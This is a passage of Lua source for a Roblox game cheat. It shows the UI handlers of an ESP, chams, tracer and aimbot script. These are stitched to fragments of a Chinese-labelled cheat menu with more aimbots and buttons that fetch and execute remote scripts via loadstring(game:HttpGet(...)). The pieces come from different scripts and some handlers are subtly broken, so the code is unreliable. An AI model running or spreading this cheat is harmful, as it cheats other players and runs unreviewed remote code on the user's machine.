				i.Transparency = v[2]
				v[1]:Destroy()
			end
		end
	end)

	FullbrightToggle.MouseButton1Click:connect(function()
		Bullshit.FullbrightEnabled = not Bullshit.FullbrightEnabled
		if Bullshit.FullbrightEnabled then
			FullbrightToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			if Bullshit.LightingEvent == nil then
				Bullshit.LightingEvent = Light.Changed:connect(LightingHax)
			end
		else
			FullbrightToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			Light.Ambient = Bullshit.AmbientBackup
			Light.ColorShift_Bottom = Bullshit.ColorShiftBotBackup
			Light.ColorShift_Top = Bullshit.ColorShiftTopBackup
		end
	end)

	Crosshair.MouseButton1Click:connect(function()
		Bullshit.CrosshairEnabled = not Bullshit.CrosshairEnabled
		if Bullshit.CrosshairEnabled then
			local g = Instance.new("ScreenGui", CoreGui)
			g.Name = "Corsshair"
			local line1 = Instance.new("TextLabel", g)
			line1.Text = ""
			line1.Size = UDim2.new(0, 35, 0, 1)
			line1.BackgroundColor3 = Bullshit.Colors.Crosshair
			line1.BorderSizePixel = 0
			line1.ZIndex = 10
			local line2 = Instance.new("TextLabel", g)
			line2.Text = ""
			line2.Size = UDim2.new(0, 1, 0, 35)
			line2.BackgroundColor3 = Bullshit.Colors.Crosshair
			line2.BorderSizePixel = 0
			line2.ZIndex = 10

            local viewport = MyCam.ViewportSize
            local centerx = viewport.X / 2
            local centery = viewport.Y / 2

            line1.Position = UDim2.new(0, centerx - (35 / 2), 0, centery - 35)
            line2.Position = UDim2.new(0, centerx, 0, centery - (35 / 2) - 35)

			Crosshair.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
		else
			local find = CoreGui:FindFirstChild("Corsshair")
			if find then
				find:Destroy()
			end

			Crosshairs.BackgroundColor3 = Color3.new(1, 1, 1)
		end
	end)

	AimbotToggle.MouseButton1Click:connect(function()
		if not (game.PlaceId == 292439477 or game.PlaceId == 606849621) then
			Bullshit.AimbotEnabled = not Bullshit.AimbotEnabled
			if Bullshit.AimbotEnabled then
				AimbotToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			else
				AimbotToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			end
		else
			local hint = Instance.new("Hint", CoreGui)
			hint.Text = "This game prevents camera manipulation!"
			wait(5)
			hint:Destroy()
		end
	end)

	TracersUnderChars.MouseButton1Click:connect(function()
		Bullshit.PlaceTracersUnderCharacter = not Bullshit.PlaceTracersUnderCharacter
		if Bullshit.PlaceTracersUnderCharacter then
			TracersUnderChars.Text = "true"
		else
			TracersUnderChars.Text = "false"
		end
	end)

	FreeForAll.MouseButton1Click:connect(function()
		Bullshit.FreeForAll = not Bullshit.FreeForAll
		if Bullshit.FreeForAll then
			FreeForAll.Text = "true"
		else
			FreeForAll.Text = "false"
		end
	end)

	ESPLength.FocusLost:connect(function()
		local txt = ESPLength.Text
		local num = tonumber(txt) or 10000
		if num ~= nil then
			if num < 100 then
				num = 100
				ESPLength.Text = num
			elseif num > 10000 then
				num = 10000
				ESPLength.Text = num
			end
		end

		Bullshit.ESPLength = num
		ESPLength.Text = num
	end)

	CHAMSLength.FocusLost:connect(function()
		local txt = CHAMSLength.Text
		local num = tonumber(txt) or 500
		if num ~= nil then
			if num < 100 then
				num = 100
				CHAMSLength.Text = num
			elseif num > 2048 then
				num = 2048
				CHAMSLength.Text = num
			end
		end

		Bullshit.CHAMSLength = num
		CHAMSLength.Text = num
	end)

	TracersLength.FocusLost:connect(function()
		local txt = TracersLength.Text
		local num = tonumber(txt) or 500
		if num ~= nil then
			if num < 100 then
				num = 100
				TracersLength.Text = num
			elseif num > 2048 then
				num = 2048
				TracersLength.Text = num
			end
		end

		Bullshit.TracersLength = num
		TracersLength.Text = num
	end)

	EnemyColor.FocusLost:connect(function()
		local R, G, B = string.match(RemoveSpacesFromString(EnemyColor.Text), "(%d+),(%d+),(%d+)")
		R = tonumber(R)
		G = tonumber(G)
		B = tonumber(B)
		if R > 1 then
			R = R / 255
		end
		if G > 1 then
			G = G / 255
		end
		if B > 1 then
			B = B / 255
		end

		if R ~= nil and G ~= nil and B ~= nil then
			if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
				Bullshit.Colors.Enemy = Color3.new(R, G, B)
				EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
			else
				EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
			end
		else
			EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
		end
	end)

	AllyColor.FocusLost:connect(function()
		local R, G, B = string.match(RemoveSpacesFromString(AllyColor.Text), "(%d+),(%d+),(%d+)")
		R = tonumber(R)
		G = tonumber(G)
		B = tonumber(B)
		if R > 1 then
			R = R / 255
		end
		if G > 1 then
			G = G / 255
		end
		if B > 1 then
			B = B / 255
		end

		if R ~= nil and G ~= nil and B ~= nil then
			if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
				Bullshit.Colors.Ally = Color3.new(R, G, B)
				AllyColor.Text = tostring(Bullshit.Colors.Ally)
			else
				AllyColor.Text = tostring(Bullshit.Colors.Ally)
			end
		else
			AllyColor.Text = tostring(Bullshit.Colors.Ally)
		end
	end)

	FriendColor.FocusLost:connect(function()
		local R, G, B = string.match(RemoveSpacesFromString(FriendColor.Text), "(%d+),(%d+),(%d+)")
		R = tonumber(R)
		G = tonumber(G)
		B = tonumber(B)
		if R > 1 then
			R = R / 255
		end
		if G > 1 then
			G = G / 255
		end
		if B > 1 then
			B = B / 255
		end

		if R ~= nil and G ~= nil and B ~= nil then
			if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
				Bullshit.Colors.Ally = Color3.new(R, G, B)
				FriendColor.Text = tostring(Bullshit.Colors.Friend)
			else
				FriendColor.Text = tostring(Bullshit.Colors.Friend)
			end
		else
			FriendColor.Text = tostring(Bullshit.Colors.Friend)
		end
	end)

	NeutralColor.FocusLost:connect(function()
		local R, G, B = string.match(RemoveSpacesFromString(NeutralColor.Text), "(%d+),(%d+),(%d+)")
		R = tonumber(R)
		G = tonumber(G)
		B = tonumber(B)
		if R > 1 then
			R = R / 255
		end
		if G > 1 then
			G = G / 255
		end
		if B > 1 then
			B = B / 255
		end

		if R ~= nil and G ~= nil and B ~= nil then
			if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
				Bullshit.Colors.Ally = Color3.new(R, G, B)
				NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
			else
				NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
			end
		else
			NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
		end
	end)

	CrosshairColor.FocusLost:connect(function()
		local R, G, B = string.match(RemoveSpacesFromString(CrosshairColor.Text), "(%d+),(%d+),(%d+)")
		R = tonumber(R)
		G = tonumber(G)
		B = tonumber(B)
		if R > 1 then
			R = R / 255
		end
		if G > 1 then
			G = G / 255
		end
		if B > 1 then
			B = B / 255
		end

		if R ~= nil and G ~= nil and B ~= nil then
			if not (R > 1 and G > 1 and B > 1) and not (R < 0 and G < 0 and B < 0) then
				Bullshit.Colors.Ally = Color3.new(R, G, B)
				EnemyColor.Text = tostring(Bullshit.Colors.Crosshair)
			else
				EnemyColor.Text = tostring(Bullshit.Colors.Crosshair)
			end
		else
			EnemyColor.Text = tostring(Bullshit.Colors.Crosshair)
		end
	end)

	AutoFireToggle.MouseButton1Click:connect(function()
		local hint = Instance.new("Hint", CoreGui)
		hint.Text = "Currently broken. :("
		wait(3)
		hint:Destroy()
		--Bullshit.AutoFire = not Bullshit.AutoFire
		--AutoFireToggle.Text = tostring(Bullshit.AutoFire)
	end)

	AimbotKey.MouseButton1Click:connect(function()
		AimbotKey.Text = "Press any Key now."
		local input = UserInput.InputBegan:wait()
		if input.UserInputType == Enum.UserInputType.Keyboard then
			Bullshit.AimbotKey = tostring(input.KeyCode)
			AimbotKey.Text = string.sub(tostring(input.KeyCode), 14)
		else
			Bullshit.AimbotKey = tostring(input.UserInputType)
			AimbotKey.Text = string.sub(tostring(input.UserInputType), 20)
		end
	end)

	MobESPButton.MouseButton1Click:connect(function()
		Bullshit.MobESP = not Bullshit.MobESP
		MobESPButton.Text = tostring(Bullshit.MobESP)
		if Bullshit.MobESP then
			local hint = Instance.new("Hint", CoreGui)
			hint.Text = "Turn ESP/Chams off and on again to see mob ESP."
			wait(5)
			hint.Text = "This is still in beta, expect problems! Message Racist Dolphin#5199 on discord if you encounter a bug!"
			wait(10)
			hint:Destroy()
		end
	end)

	MobChamsButton.MouseButton1Click:connect(function()
		Bullshit.MobChams = not Bullshit.MobChams
		MobChamsButton.Text = tostring(Bullshit.MobChams)
		if Bullshit.MobChams then
			local hint = Instance.new("Hint", CoreGui)
			hint.Text = "Turn ESP/Chams off and on again to see mob chams."
			wait(5)
			hint.Text = "This is still in beta, expect problems! Message Racist Dolphin#5199 on discord if you encounter a bug!"
			wait(10)
			hint:Destroy()
		end
	end)

	Playername.FocusLost:connect(function()
		local FindPlr = FindPlayer(Playername.Text)
		if FindPlr then
			Playername.Text = FindPlr.Name
		elseif not Bullshit.Blacklist[Playername.Text] then
			Playername.Text = "Player not Found!"
			wait(1)
			Playername.Text = "Enter Player Name"
		end
	end)

	AddToBlacklist.MouseButton1Click:connect(function()
		local FindPlr = FindPlayer(Playername.Text)
		if FindPlr then
			if not Bullshit.Blacklist[FindPlr.Name] then
				Bullshit.Blacklist[FindPlr.Name] = true
				UpdateChams(FindPlr)
				CreatePlayerLabel(FindPlr.Name, players)
			end
		end
	end)

	RemoveToBlacklist.MouseButton1Click:connect(function()
		local FindPlr = FindPlayer(Playername.Text)
		if FindPlr then
			if Bullshit.Blacklist[FindPlr.Name] then
				Bullshit.Blacklist[FindPlr.Name] = nil
				UpdateChams(FindPlr)
				RefreshPlayerLabels(players, Bullshit.Blacklist)
			end
		else
			if Bullshit.Blacklist[Playername.Text] then
				Bullshit.Blacklist[Playername.Text] = nil
				RefreshPlayerLabels(players, Bullshit.Blacklist)
			end
		end
	end)

	Playername2.FocusLost:connect(function()
		local FindPlr = FindPlayer(Playername2.Text)
		if FindPlr then
			Playername2.Text = FindPlr.Name
		elseif not Bullshit.FriendList[Playername2.Text] then
			Playername2.Text = "Player not Found!"
			wait(1)
			Playername2.Text = "Enter Player Name"
		end
	end)

	AddToWhitelist.MouseButton1Click:connect(function()
		local FindPlr = FindPlayer(Playername2.Text)
		if FindPlr then
			if not Bullshit.FriendList[FindPlr.Name] then
				Bullshit.FriendList[FindPlr.Name] = true
				UpdateChams(FindPlr)
				CreatePlayerLabel(FindPlr.Name, players2)
			end
		end
	end)

	RemoveToWhitelist.MouseButton1Click:connect(function()
		local FindPlr = FindPlayer(Playername2.Text)
		if FindPlr then
			if Bullshit.FriendList[FindPlr.Name] then
				Bullshit.FriendList[FindPlr.Name] = nil
				UpdateChams(FindPlr)
				RefreshPlayerLabels(players2, Bullshit.FriendList)
			end
		else
			if Bullshit.FriendList[Playername2.Text] then
				Bullshit.FriendList[Playername2.Text] = nil
				RefreshPlayerLabels(players2, Bullshit.FriendList)
			end
		end
	end)

	SaveWhitelist.MouseButton1Click:connect(function()
		pcall(function()
			writefile("Whitelist.txt", HTTP:JSONEncode(Bullshit.FriendList))
		end)
		SaveWhitelist.Text = "Saved!"
		wait(1)
		SaveWhitelist.Text = "Save Friends List"
	end)

	SaveBlacklist.MouseButton1Click:connect(function()
		pcall(function()
			writefile("Blacklist.txt", HTTP:JSONEncode(Bullshit.Blacklist))
		end)
		SaveBlacklist.Text = "Saved!"
		wait(1)
		SaveBlacklist.Text = "Save Blacklist"
	end)

	Settings.MouseButton1Click:connect(function()
		Settings_2.Visible = not Settings_2.Visible
		Information_2.Visible = false
		Blacklist.Visible = false
		Whitelist.Visible = false
		if Settings_2.Visible then
			Settings.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			Information.BackgroundColor3 = Color3.new(1, 1, 1)
			BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
		else
			Settings.BackgroundColor3 = Color3.new(1, 1, 1)
		end
	end)

	Information.MouseButton1Click:connect(function()
		Information_2.Visible = not Information_2.Visible
		Settings_2.Visible = false
		Blacklist.Visible = false
		Whitelist.Visible = false
		if Information_2.Visible then
			Information.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			Settings.BackgroundColor3 = Color3.new(1, 1, 1)
			BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
		else
			Information.BackgroundColor3 = Color3.new(1, 1, 1)
		end
	end)

	BlacklistToggle.MouseButton1Click:connect(function()
		Blacklist.Visible = not Blacklist.Visible
		Settings_2.Visible = false
		Information_2.Visible = false
		Whitelist.Visible = false
		if Blacklist.Visible then
			BlacklistToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			Settings.BackgroundColor3 = Color3.new(1, 1, 1)
			Information.BackgroundColor3 = Color3.new(1, 1, 1)
			WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
		else
			BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
		end
	end)

	WhitelistToggle.MouseButton1Click:connect(function()
		Whitelist.Visible = not Whitelist.Visible
		Settings_2.Visible = false
		Information_2.Visible = false
		Blacklist.Visible = false
		if Whitelist.Visible then
			WhitelistToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			Settings.BackgroundColor3 = Color3.new(1, 1, 1)
			Information.BackgroundColor3 = Color3.new(1, 1, 1)
			BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
		else
			WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
		end
	end)

	SaveSettings.MouseButton1Click:connect(function()
		SaveBullshitSettings()
		SaveSettings.Text = "Saved!"
		wait(1)
		SaveSettings.Text = "Save Settings"
	end)

	UserInput.InputBegan:connect(function(input, ingui)
		if not ingui then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				if input.KeyCode == Enum.KeyCode.P then
					MainFrame.Visible = not MainFrame.Visible
				end
			end

			if tostring(input.KeyCode) == Bullshit.AimbotKey or tostring(input.UserInputType) == Bullshit.AimbotKey then
				Bullshit.Aimbot = true
			end
		end
	end)

	UserInput.InputEnded:connect(function(input)
		if tostring(input.KeyCode) == Bullshit.AimbotKey or tostring(input.UserInputType) == Bullshit.AimbotKey then
			Bullshit.Aimbot = false
		end
	end)
end

InitMain()

Run:BindToRenderStep("UpdateESP", Enum.RenderPriority.Character.Value, function()
	for _, v in next, Plrs:GetPlayers() do
		if v ~= MyPlr then
			UpdateESP(v)
		end
	end
end)

Run:BindToRenderStep("UpdateInfo", 1000, function()
	Bullshit.ClosestEnemy = GetClosestPlayer()
	MyChar = MyPlr.Character
	if Bullshit.DebugInfo then
		local MyHead, MyTor, MyHum = MyChar:FindFirstChild("Head"), MyChar:FindFirstChild("HumanoidRootPart"), MyChar:FindFirstChild("Humanoid")

		local GetChar, GetHead, GetTor, GetHum = nil, nil, nil, nil
		if Bullshit.ClosestEnemy ~= nil then
			GetChar = Bullshit.ClosestEnemy.Character
			GetHead = GetChar:FindFirstChild("Head")
			GetTor = GetChar:FindFirstChild("HumanoidRootPart")
			GetHum = GetChar:FindFirstChild("Humanoid")

			DebugMenu["PlayerSelected"].Text = "Closest Enemy: " .. tostring(Bullshit.ClosestEnemy)

			if Bullshit.ClosestEnemy.Team ~= nil then
				DebugMenu["PlayerTeam"].Text = "Team: " .. tostring(Bullshit.ClosestEnemy.Team)
			else
				DebugMenu["PlayerTeam"].Text = "Team: nil"
			end

			if GetHum then
				DebugMenu["PlayerHealth"].Text = "Health: " .. string.format("%.0f", GetHum.Health)
			end
			if MyTor and GetTor then
				local Pos = GetTor.Position
				local Dist = (MyTor.Position - Pos).magnitude
				DebugMenu["PlayerPosition"].Text = "Position: (X: " .. string.format("%.3f", Pos.X) .. " Y: " .. string.format("%.3f", Pos.Y) .. " Z: " .. string.format("%.3f", Pos.Z) .. ") Distance: " .. string.format("%.0f", Dist) .. " Studs"

				local MyCharStuff = MyChar:GetDescendants()
				local GetCharStuff = GetChar:GetDescendants()
				for _, v in next, GetCharStuff do
					if v ~= GetTor then
						table.insert(MyCharStuff, v)
					end
				end
				local Ray = Ray.new(MyTor.Position, (Pos - MyTor.Position).unit * 300)
				local part = workspace:FindPartOnRayWithIgnoreList(Ray, MyCharStuff)
				if part == GetTor then
					DebugMenu["BehindWall"].Text = "Behind Wall: false"
				else
					DebugMenu["BehindWall"].Text = "Behind Wall: true"
				end

				DebugMenu["Main"].Size = UDim2.new(0, DebugMenu["PlayerPosition"].TextBounds.X, 0, 200)
			end
		end

		-- My Position
		if MyTor then
			local Pos = MyTor.Position
			DebugMenu["Position"].Text = "My Position: (X: " .. string.format("%.3f", Pos.x) .. " Y: " .. string.format("%.3f", Pos.Y) .. " Z: " .. string.format("%.3f", Pos.Z) .. ")"
		end

		-- FPS
		local fps = math.floor(.5 + (1 / (tick() - LastTick)))
		local sum = 0
		local ave = 0
		table.insert(Bullshit.FPSAverage, fps)
		for i = 1, #Bullshit.FPSAverage do
			sum = sum + Bullshit.FPSAverage[i]
		end
		DebugMenu["FPS"].Text = "FPS: " .. tostring(fps) .. " Average: " .. string.format("%.0f", (sum / #Bullshit.FPSAverage))
		if (tick() - LastTick) >= 15 then
			Bullshit.FPSAverage = { }
			LastTick = tick()
		end
		LastTick = tick()
	end
end)

Run:BindToRenderStep("Aimbot", Enum.RenderPriority.First.Value, function()
	ClosestEnemy = GetClosestPlayerNotBehindWall()
	if Bullshit.AimbotEnabled and Bullshit.Aimbot then
		if ClosestEnemy ~= nil then
			local GetChar = ClosestEnemy.Character
			if MyChar and GetChar then
				local MyCharStuff = MyChar:GetDescendants()
				local MyHead = MyChar:FindFirstChild("Head")
				local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
				local MyHum = MyChar:FindFirstChild("Humanoid")
				local GetHead = GetChar:FindFirstChild("Head")
				local GetTor = GetChar:FindFirstChild("HumanoidRootPart")
				local GetHum = GetChar:FindFirstChild("Humanoid")
				if MyHead and MyTor and MyHum and GetHead and GetTor and GetHum then
					if MyHum.Health > 1 and (GetHum.Health > 1 and not GetChar:FindFirstChild("KO")) then
						MyPlr.CameraMode = Enum.CameraMode.LockFirstPerson
						MyCam.CFrame = CFrame.new(MyHead.CFrame.p, GetHead.CFrame.p)
						if Bullshit.AutoFire then
							mouse1click() -- >:(
						end
					end
				end
			end
		end
	else
		MyPlr.CameraMode = Bullshit.CameraModeBackup
	end
end)

local succ, out = coroutine.resume(coroutine.create(function()
	while true do
		for _, v in next, Plrs:GetPlayers() do
			UpdateChams(v)
			Run.RenderStepped:wait()
		end
	end
end))

if not succ then
	error(out)
end

  	end    

})

Tab:AddButton({

	Name = "自瞄",

	Callback = function()

     local fov = 100 local smoothness = 10 local crosshairDistance = 5 local RunService = game:GetService("RunService") local UserInputService = game:GetService("UserInputService") local Players = game:GetService("Players") local Cam = game.Workspace.CurrentCamera local FOVring = Drawing.new("Circle") FOVring.Visible = true FOVring.Thickness = 2 FOVring.Color = Color3.fromRGB(0, 255, 0) FOVring.Filled = false FOVring.Radius = fov FOVring.Position = Cam.ViewportSize / 2 local Player = Players.LocalPlayer local PlayerGui = Player:WaitForChild("PlayerGui") local ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "FovAdjustGui" ScreenGui.Parent = PlayerGui local Frame = Instance.new("Frame") Frame.Name = "MainFrame" Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) Frame.BorderColor3 = Color3.fromRGB(128, 0, 128) Frame.BorderSizePixel = 2 Frame.Position = UDim2.new(0.3, 0, 0.3, 0) Frame.Size = UDim2.new(0.4, 0, 0.4, 0) Frame.Active = true Frame.Draggable = true Frame.Parent = ScreenGui local MinimizeButton = Instance.new("TextButton") MinimizeButton.Name = "MinimizeButton" MinimizeButton.Text = "-" MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255) MinimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) MinimizeButton.Position = UDim2.new(0.9, 0, 0, 0) MinimizeButton.Size = UDim2.new(0.1, 0, 0.1, 0) MinimizeButton.Parent = Frame local isMinimized = false MinimizeButton.MouseButton1Click:Connect(function() isMinimized = not isMinimized if isMinimized then Frame:TweenSize(UDim2.new(0.1, 0, 0.1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true) MinimizeButton.Text = "+" else Frame:TweenSize(UDim2.new(0.4, 0, 0.4, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true) MinimizeButton.Text = "-" end end) local FovLabel = Instance.new("TextLabel") FovLabel.Name = "FovLabel" FovLabel.Text = "自瞄范围" FovLabel.TextColor3 = Color3.fromRGB(255, 255, 255) FovLabel.BackgroundTransparency = 1 FovLabel.Position = UDim2.new(0.1, 0, 0.1, 0) FovLabel.Size = UDim2.new(0.8, 0, 0.2, 0) FovLabel.Parent = Frame local FovSlider = Instance.new("TextBox") FovSlider.Name = "FovSlider" FovSlider.Text = tostring(fov) FovSlider.TextColor3 = Color3.fromRGB(255, 255, 255) FovSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) FovSlider.Position = UDim2.new(0.1, 0, 0.3, 0) FovSlider.Size = UDim2.new(0.8, 0, 0.2, 0) FovSlider.Parent = Frame local SmoothnessLabel = Instance.new("TextLabel") SmoothnessLabel.Name = "SmoothnessLabel" SmoothnessLabel.Text = "自瞄平滑度" SmoothnessLabel.TextColor3 = Color3.fromRGB(255, 255, 255) SmoothnessLabel.BackgroundTransparency = 1 SmoothnessLabel.Position = UDim2.new(0.1, 0, 0.5, 0) SmoothnessLabel.Size = UDim2.new(0.8, 0, 0.2, 0) SmoothnessLabel.Parent = Frame local SmoothnessSlider = Instance.new("TextBox") SmoothnessSlider.Name = "SmoothnessSlider" SmoothnessSlider.Text = tostring(smoothness) SmoothnessSlider.TextColor3 = Color3.fromRGB(255, 255, 255) SmoothnessSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) SmoothnessSlider.Position = UDim2.new(0.1, 0, 0.7, 0) SmoothnessSlider.Size = UDim2.new(0.8, 0, 0.2, 0) SmoothnessSlider.Parent = Frame local CrosshairDistanceLabel = Instance.new("TextLabel") CrosshairDistanceLabel.Name = "CrosshairDistanceLabel" CrosshairDistanceLabel.Text = "自瞄预判距离" CrosshairDistanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255) CrosshairDistanceLabel.BackgroundTransparency = 1 CrosshairDistanceLabel.Position = UDim2.new(0.1, 0, 0.9, 0) CrosshairDistanceLabel.Size = UDim2.new(0.8, 0, 0.2, 0) CrosshairDistanceLabel.Parent = Frame local CrosshairDistanceSlider = Instance.new("TextBox") CrosshairDistanceSlider.Name = "CrosshairDistanceSlider" CrosshairDistanceSlider.Text = tostring(crosshairDistance) CrosshairDistanceSlider.TextColor3 = Color3.fromRGB(255, 255, 255) CrosshairDistanceSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) CrosshairDistanceSlider.Position = UDim2.new(0.1, 0, 1.1, 0) CrosshairDistanceSlider.Size = UDim2.new(0.8, 0, 0.2, 0) CrosshairDistanceSlider.Parent = Frame local targetCFrame = Cam.CFrame local function updateDrawings() local camViewportSize = Cam.ViewportSize FOVring.Position = camViewportSize / 2 FOVring.Radius = fov end local function onKeyDown(input) if input.KeyCode == Enum.KeyCode.Delete then RunService:UnbindFromRenderStep("FOVUpdate") FOVring:Remove() end end UserInputService.InputBegan:Connect(onKeyDown) local function getClosestPlayerInFOV(trg_part) local nearest = nil local last = math.huge local playerMousePos = Cam.ViewportSize / 2 for _, player in ipairs(Players:GetPlayers()) do if player ~= Players.LocalPlayer then local part = player.Character and player.Character:FindFirstChild(trg_part) if part then local ePos, isVisible = Cam:WorldToViewportPoint(part.Position) local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude if distance < last and isVisible and distance < fov then last = distance nearest = player end end end end return nearest end RunService.RenderStepped:Connect(function() updateDrawings() local closest = getClosestPlayerInFOV("Head") if closest and closest.Character:FindFirstChild("Head") then local targetCharacter = closest.Character local targetHead = targetCharacter.Head local targetRootPart = targetCharacter:FindFirstChild("HumanoidRootPart") local isMoving = targetRootPart.Velocity.Magnitude > 0.1 local targetPosition if isMoving then targetPosition = targetHead.Position + (targetHead.CFrame.LookVector * crosshairDistance) else targetPosition = targetHead.Position end targetCFrame = CFrame.new(Cam.CFrame.Position, targetPosition) else targetCFrame = Cam.CFrame end Cam.CFrame = Cam.CFrame:Lerp(targetCFrame, 1 / smoothness) end) FovSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newFov = tonumber(FovSlider.Text) if newFov then fov = newFov else FovSlider.Text = tostring(fov) end end end) SmoothnessSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newSmoothness = tonumber(SmoothnessSlider.Text) if newSmoothness then smoothness = newSmoothness else SmoothnessSlider.Text = tostring(smoothness) end end end) CrosshairDistanceSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newCrosshairDistance = tonumber(CrosshairDistanceSlider.Text) if newCrosshairDistance then crosshairDistance = newCrosshairDistance else CrosshairDistanceSlider.Text = tostring(crosshairDistance) end end end)

  	end    

})

Tab:AddButton({

	Name = "正常自瞄",

	Callback = function()

     local fov = 75
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local Cam = game.Workspace.CurrentCamera
 
local FOVring = Drawing.new("Circle")
FOVring.Visible = true
FOVring.Thickness = 2
FOVring.Color = Color3.fromRGB(0, 0, 0) -- black color
FOVring.Filled = false
FOVring.Radius = fov
FOVring.Position = Cam.ViewportSize / 2
 
local function updateDrawings()
    local camViewportSize = Cam.ViewportSize
    FOVring.Position = camViewportSize / 2
end
 
local function onKeyDown(input)
    if input.KeyCode == Enum.KeyCode.Delete then
        RunService:UnbindFromRenderStep("FOVUpdate")
        FOVring:Remove()
    end
end
 
UserInputService.InputBegan:Connect(onKeyDown)
 
local function lookAt(target)
    local lookVector = (target - Cam.CFrame.Position).unit
    local newCFrame = CFrame.new(Cam.CFrame.Position, Cam.CFrame.Position + lookVector)
    Cam.CFrame = newCFrame
end
 
local function getClosestPlayerInFOV(trg_part)
    local nearest = nil
    local last = math.huge
    local playerMousePos = Cam.ViewportSize / 2
 
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            local part = player.Character and player.Character:FindFirstChild(trg_part)
            if part then
                local ePos, isVisible = Cam:WorldToViewportPoint(part.Position)
                local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude
 
                if distance < last and isVisible and distance < fov then
                    last = distance
                    nearest = player
                end
            end
        end
    end
 
    return nearest
end
 
RunService.RenderStepped:Connect(function()
    updateDrawings()
    local closest = getClosestPlayerInFOV("Head")
    if closest and closest.Character:FindFirstChild("Head") then
        lookAt(closest.Character.Head.Position)
    end
end)

  	end    

})

Tab:AddButton({

	Name = "阿尔子追",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/sgbs/main/%E4%B8%81%E4%B8%81%20%E6%B1%89%E5%8C%96%E8%87%AA%E7%9E%84.txt"))()

  	end    

})

Tab:AddButton({

	Name = "俄州子追",

	Callback = function()

     loadstring(game:HttpGet("https://gist.githubusercontent.com/ClasiniZukov/e7547e7b48fa90d10eb7f85bd3569147/raw/f95cd3561a3bb3ac6172a14eb74233625b52e757/gistfile1.txt"))()

  	end    

})

Tab:AddButton({

	Name = "自瞄+子追（改速度和跳跃）",

	Callback = function()

     wait(0.5)

local Camera = workspace.CurrentCamera
local uis = game:GetService("UserInputService")
local ts = game:GetService("TweenService")
local Main = Instance.new("ScreenGui")
local Loader = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Blur = Instance.new("ImageLabel")
local UICorner_2 = Instance.new("UICorner")
local quotasloader = Instance.new("TextLabel")
local Bar = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local Loaded = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")

Main.Name = "Main"
Main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Main.ResetOnSpawn = false
Main.DisplayOrder = 9999

Loader.Name = "Loader"
Loader.Parent = Main
Loader.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Loader.BackgroundTransparency = 0.200
Loader.BorderColor3 = Color3.fromRGB(0, 0, 0)
Loader.BorderSizePixel = 0
Loader.Position = UDim2.new(0.436969697, 0, 0.455082744, 0)
Loader.Size = UDim2.new(0, 0, 0, 76)
Loader.Active = true

UICorner.Parent = Loader

Blur.Name = "Blur"
Blur.Parent = Loader
Blur.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
Blur.BackgroundTransparency = 1.000
Blur.BorderColor3 = Color3.fromRGB(0, 0, 0)
Blur.BorderSizePixel = 0
Blur.Position = UDim2.new(-0.00483091781, 0, 0, 0)
Blur.Size = UDim2.new(0, 0, 0, 76)
Blur.Image = "http://www.roblox.com/asset/?id=6758962034"
Blur.ImageTransparency = 0.550

UICorner_2.Parent = Blur

quotasloader.Name = "quotasloader"
quotasloader.Parent = Loader
quotasloader.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
quotasloader.BackgroundTransparency = 1.000
quotasloader.BorderColor3 = Color3.fromRGB(0, 0, 0)
quotasloader.BorderSizePixel = 0
